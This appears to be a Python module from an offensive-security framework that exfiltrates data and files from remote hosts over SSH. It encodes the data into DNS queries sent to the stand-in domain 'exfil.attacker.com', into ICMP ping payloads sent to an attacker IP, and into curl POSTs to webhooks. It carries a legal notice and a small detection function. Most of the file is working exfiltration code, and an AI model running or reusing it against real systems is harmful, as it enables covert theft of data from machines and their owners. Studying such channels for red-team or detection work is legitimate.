"""
Netrunner Exfiltration Module — Data exfiltration via DNS and ICMP tunneling.

Provides:
- DNS exfiltration (encode data in DNS queries)
- ICMP exfiltration (encode data in ICMP echo requests)
- HTTP/HTTPS covert channels
- File chunking and encoding
- Exfiltration detection and prevention

⚠️  LEGAL NOTICE: These tools are for AUTHORIZED penetration testing only.
    Unauthorized data exfiltration is illegal. Always obtain written
    authorization before performing any security testing.
"""

import asyncio
import base64
import os
import struct
import time
import random
import string
from typing import Optional
from backend.core.logger import log as logger

try:
    import paramiko

    PARAMIKO_AVAILABLE = True
except ImportError:
    PARAMIKO_AVAILABLE = False

EXFIL_DIR = "data/exfiltration"


def _ensure_exfil_dir():
    os.makedirs(EXFIL_DIR, exist_ok=True)
    os.makedirs(os.path.join(EXFIL_DIR, "captures"), exist_ok=True)


async def _ssh_exec(
    host: str, username: str, password: str, command: str, port: int = 22
) -> tuple[int, str, str]:
    """Execute a command over SSH."""
    if not PARAMIKO_AVAILABLE:
        return -1, "", "paramiko not installed"

    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        await asyncio.to_thread(
            client.connect,
            hostname=host,
            port=port,
            username=username,
            password=password,
            timeout=10,
            look_for_keys=False,
            allow_agent=False,
        )
        _, stdout, stderr = await asyncio.to_thread(
            client.exec_command, command, timeout=60
        )
        exit_code = await asyncio.to_thread(stdout.channel.recv_exit_status)
        out = await asyncio.to_thread(stdout.read().decode, errors="replace")
        err = await asyncio.to_thread(stderr.read().decode, errors="replace")
        return exit_code, out, err
    except Exception as e:
        return -1, "", str(e)
    finally:
        client.close()


def _chunk_data(data: bytes, chunk_size: int = 63) -> list[bytes]:
    """
    Split data into chunks suitable for DNS labels.
    DNS labels max 63 bytes. We use base32 encoding which expands ~1.6x.
    So max raw chunk = 63 / 1.6 ≈ 39 bytes.
    """
    max_raw = int(chunk_size * 0.6)
    return [data[i : i + max_raw] for i in range(0, len(data), max_raw)]


def _encode_chunk(chunk: bytes) -> str:
    """Encode bytes to DNS-safe label using base32."""
    encoded = base64.b32encode(chunk).decode().rstrip("=").lower()
    return encoded


def _decode_chunk(label: str) -> bytes:
    """Decode DNS label back to bytes."""
    # Add padding
    padding = 8 - len(label) % 8
    if padding != 8:
        label += "=" * padding
    return base64.b32decode(label.upper())


async def dns_exfiltrate(
    node_id: str,
    host: str,
    username: str,
    password: str,
    data: str,
    domain: str = "exfil.attacker.com",
    encoding: str = "base32",
) -> dict:
    """
    Exfiltrate data via DNS queries.

    Encodes data as subdomain labels and sends DNS queries to the attacker's
    authoritative DNS server. The attacker can decode the data from the queries.

    Args:
        node_id: Source node ID
        host: Source node hostname
        username: SSH username
        password: SSH password
        data: Data to exfiltrate (string)
        domain: Attacker's domain (NS must point to attacker)
        encoding: Encoding scheme (base32, base64, hex)

    Returns:
        dict with exfiltration results
    """
    logger.warning(f"[EXFIL] DNS exfiltration from {host} via {domain}")

    data_bytes = data.encode("utf-8")
    chunks = _chunk_data(data_bytes)
    total_chunks = len(chunks)

    # Build the DNS exfiltration script
    script_lines = [
        "#!/bin/bash",
        f'echo "Starting DNS exfiltration: {total_chunks} chunks"',
    ]

    for i, chunk in enumerate(chunks):
        if encoding == "base32":
            label = _encode_chunk(chunk)
        elif encoding == "base64":
            label = base64.urlsafe_b64encode(chunk).decode().rstrip("=").lower()
        elif encoding == "hex":
            label = chunk.hex()
        else:
            label = _encode_chunk(chunk)

        # Truncate label to 63 chars (DNS limit)
        label = label[:63]
        query_name = f"{label}.{i}.{total_chunks}.{domain}"

        script_lines.append(f"dig +short {query_name} > /dev/null 2>&1")
        script_lines.append(f'echo "Sent chunk {i+1}/{total_chunks}"')

    script_lines.append(f'echo "Exfiltration complete: {total_chunks} chunks sent"')

    script = "\n".join(script_lines)

    # Execute on remote node
    exit_code, out, err = await _ssh_exec(
        host, username, password, f"bash -c '{script}'"
    )

    return {
        "success": exit_code == 0,
        "method": "dns",
        "domain": domain,
        "encoding": encoding,
        "total_chunks": total_chunks,
        "data_size": len(data_bytes),
        "output": out if out else err,
    }


async def icmp_exfiltrate(
    node_id: str,
    host: str,
    username: str,
    password: str,
    data: str,
    target_ip: str,
    encoding: str = "hex",
) -> dict:
    """
    Exfiltrate data via ICMP echo requests.

    Encodes data in the payload of ICMP echo requests (ping packets).
    The attacker captures these packets to extract the data.

    Args:
        node_id: Source node ID
        host: Source node hostname
        username: SSH username
        password: SSH password
        data: Data to exfiltrate
        target_ip: Attacker's IP to send ICMP to
        encoding: Encoding (hex, base64)

    Returns:
        dict with exfiltration results
    """
    logger.warning(f"[EXFIL] ICMP exfiltration from {host} to {target_ip}")

    data_bytes = data.encode("utf-8")

    # Use python scapy for ICMP exfiltration
    script = f'''#!/usr/bin/env python3
import struct
import socket
import time

data = b"{base64.b64encode(data_bytes).decode()}"
import base64
data = base64.b64decode(data)

def send_icmp_exfil(data, target, chunk_size=32):
    """Send data via ICMP echo requests."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    seq = 0
    for i in range(0, len(data), chunk_size):
        chunk = data[i:i+chunk_size]
        # ICMP header: type(8) code(0) checksum(0) id(random) seq
        icmp_id = int(time.time() * 1000) % 65535
        header = struct.pack('!BBHHH', 8, 0, 0, icmp_id, seq)
        # Calculate checksum
        checksum = _checksum(header + chunk)
        header = struct.pack('!BBHHH', 8, 0, checksum, icmp_id, seq)
        packet = header + chunk
        sock.sendto(packet, (target, 0))
        seq += 1
        time.sleep(0.1)
    sock.close()
    return seq

def _checksum(data):
    if len(data) % 2:
        data += b'\\x00'
    s = 0
    for i in range(0, len(data), 2):
        w = (data[i] << 8) + data[i+1]
        s += w
    s = (s >> 16) + (s & 0xffff)
    s += (s >> 16)
    return ~s & 0xffff

packets_sent = send_icmp_exfil(data, "{target_ip}")
print(f"Sent {{packets_sent}} ICMP packets")
'''

    exit_code, out, err = await _ssh_exec(
        host, username, password, f"python3 -c '{script}'"
    )

    return {
        "success": exit_code == 0,
        "method": "icmp",
        "target_ip": target_ip,
        "data_size": len(data_bytes),
        "output": out if out else err,
    }


async def http_exfiltrate(
    node_id: str,
    host: str,
    username: str,
    password: str,
    data: str,
    webhook_url: str,
    encoding: str = "json",
) -> dict:
    """
    Exfiltrate data via HTTP POST request.

    Sends data to a webhook URL (e.g., Discord, Slack, custom server).

    Args:
        node_id: Source node ID
        host: Source node hostname
        username: SSH username
        password: SSH password
        data: Data to exfiltrate
        webhook_url: Target webhook URL
        encoding: Encoding (json, raw, base64)

    Returns:
        dict with exfiltration results
    """
    logger.warning(f"[EXFIL] HTTP exfiltration from {host} to {webhook_url}")

    import json
    import base64

    if encoding == "json":
        payload = json.dumps({"data": data, "source": host, "timestamp": time.time()})
    elif encoding == "base64":
        payload = base64.b64encode(data.encode()).decode()
    else:
        payload = data

    # Escape for shell
    payload_escaped = payload.replace("'", "'\\''")

    script = f'''curl -s -X POST -H "Content-Type: application/json" -d '{payload_escaped}' {webhook_url} > /dev/null 2>&1 && echo "SENT" || echo "FAILED"'''

    exit_code, out, err = await _ssh_exec(host, username, password, script)

    return {
        "success": "SENT" in (out or ""),
        "method": "http",
        "webhook_url": webhook_url,
        "encoding": encoding,
        "data_size": len(payload),
        "output": out if out else err,
    }


async def exfil_file(
    node_id: str,
    host: str,
    username: str,
    password: str,
    file_path: str,
    method: str = "dns",
    **kwargs,
) -> dict:
    """
    Exfiltrate a file from a remote node.

    Reads the file, chunks it, and exfiltrates via the chosen method.
    """
    logger.warning(f"[EXFIL] Exfiltrating file {file_path} from {host} via {method}")

    # Read file on remote node
    exit_code, out, err = await _ssh_exec(
        host,
        username,
        password,
        f"base64 {file_path} 2>/dev/null || echo FILE_NOT_FOUND",
    )

    if "FILE_NOT_FOUND" in (out or ""):
        return {"success": False, "error": f"File not found: {file_path}"}

    # Decode the base64 content
    try:
        file_data = base64.b64decode(out.strip())
    except Exception:
        return {"success": False, "error": "Failed to decode file content"}

    # Exfiltrate based on method
    data_str = base64.b64encode(file_data).decode()

    if method == "dns":
        return await dns_exfiltrate(
            node_id,
            host,
            username,
            password,
            data_str,
            kwargs.get("domain", "exfil.attacker.com"),
            kwargs.get("encoding", "base32"),
        )
    elif method == "icmp":
        return await icmp_exfiltrate(
            node_id,
            host,
            username,
            password,
            data_str,
            kwargs.get("target_ip", "10.0.0.1"),
        )
    elif method == "http":
        return await http_exfiltrate(
            node_id,
            host,
            username,
            password,
            data_str,
            kwargs.get("webhook_url", ""),
        )
    else:
        return {"success": False, "error": f"Unknown method: {method}"}


async def detect_exfiltration(
    node_id: str,
    host: str,
    username: str,
    password: str,
) -> dict:
    """
    Detect potential data exfiltration on a node.

    Checks for:
    - Unusual DNS query patterns
    - High ICMP traffic
    - Suspicious outbound connections
    - Large data transfers
    """
    logger.info(f"[EXFIL] Running exfiltration detection on {host}")

    findings = []

    # Check DNS queries
    exit_code, out, _ = await _ssh_exec(
        host,
        username,
        password,
        "cat /var/log/syslog 2>/dev/null | grep -i 'query\\[A\\]' | tail -50 || journalctl -u systemd-resolved --no-pager -n 50 2>/dev/null",
    )
    if out:
        dns_lines = out.strip().splitlines()
        if len(dns_lines) > 40:
            findings.append(
                {
                    "type": "high_dns_volume",
                    "severity": "medium",
                    "description": f"High DNS query volume: {len(dns_lines)} queries in log window",
                }
            )

        # Check for unusual domain patterns (base32 encoded)
        import re

        for line in dns_lines:
            if re.search(r"[a-z2-7]{20,}\.", line):
                findings.append(
                    {
                        "type": "suspicious_dns",
                        "severity": "high",
                        "description": "Suspicious DNS query with encoded subdomain detected",
                        "sample": line[:100],
                    }
                )
                break

    # Check ICMP traffic
    exit_code, out, _ = await _ssh_exec(
        host,
        username,
        password,
        "cat /proc/net/snmp | grep -i icmp || echo NO_ICMP_DATA",
    )
    if out and "NO_ICMP_DATA" not in out:
        findings.append(
            {
                "type": "icmp_activity",
                "severity": "info",
                "description": "ICMP activity detected on node",
            }
        )

    # Check for large outbound connections
    exit_code, out, _ = await _ssh_exec(
        host,
        username,
        password,
        "ss -tunap | awk '{if($5 ~ /:/) print $5}' | cut -d: -f1 | sort | uniq -c | sort -rn | head -10",
    )
    if out:
        for line in out.strip().splitlines():
            parts = line.strip().split()
            if len(parts) == 2:
                count, ip = parts
                try:
                    if int(count) > 100:
                        findings.append(
                            {
                                "type": "high_connection_volume",
                                "severity": "medium",
                                "description": f"High connection count to {ip}: {count} connections",
                            }
                        )
                except ValueError:
                    pass

    # Check for base64 encoding tools usage
    exit_code, out, _ = await _ssh_exec(
        host,
        username,
        password,
        "ps aux | grep -E '(base64|xxd|openssl|curl|wget)' | grep -v grep || echo NONE",
    )
    if out and "NONE" not in out:
        findings.append(
            {
                "type": "encoding_tools_active",
                "severity": "high",
                "description": "Encoding/transfer tools detected running",
                "processes": out.strip(),
            }
        )

    return {
        "success": True,
        "node_id": node_id,
        "host": host,
        "findings_count": len(findings),
        "findings": findings,
    }


def get_exfil_methods() -> list[dict]:
    """List available exfiltration methods."""
    return [
        {
            "id": "dns",
            "name": "DNS Exfiltration",
            "description": "Encode data as DNS subdomain queries",
            "stealth": "High",
            "speed": "Slow",
            "requirements": "Attacker-controlled DNS server",
        },
        {
            "id": "icmp",
            "name": "ICMP Exfiltration",
            "description": "Encode data in ICMP echo request payloads",
            "stealth": "Medium",
            "speed": "Medium",
            "requirements": "Raw socket access (root), attacker IP",
        },
        {
            "id": "http",
            "name": "HTTP/HTTPS Exfiltration",
            "description": "Send data via HTTP POST to webhook",
            "stealth": "Low",
            "speed": "Fast",
            "requirements": "Outbound HTTP access, webhook URL",
        },
    ]
